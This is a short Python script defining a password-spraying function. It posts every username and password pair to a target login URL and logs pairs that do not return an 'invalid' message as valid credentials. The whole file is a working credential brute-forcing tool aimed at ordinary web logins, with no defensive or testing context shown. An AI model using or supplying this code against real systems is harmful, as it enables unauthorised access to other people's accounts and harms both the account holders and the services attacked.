import requests

def password_spray(base_url, usernames, passwords, path, logger=print):
    login_url = f"{base_url.rstrip('/')}/{path.lstrip('/')}"
    logger(f"[Brute] Target: {login_url}")

    for user in usernames:
        for pwd in passwords:
            try:
                r = requests.post(login_url, data={"username": user, "password": pwd}, timeout=5)
                if "invalid" not in r.text.lower() and r.status_code == 200:
                    logger(f"[+] Valid combo: {user}:{pwd}")
            except Exception as e:
                logger(f"[!] Error on {user}:{pwd} -> {e}")
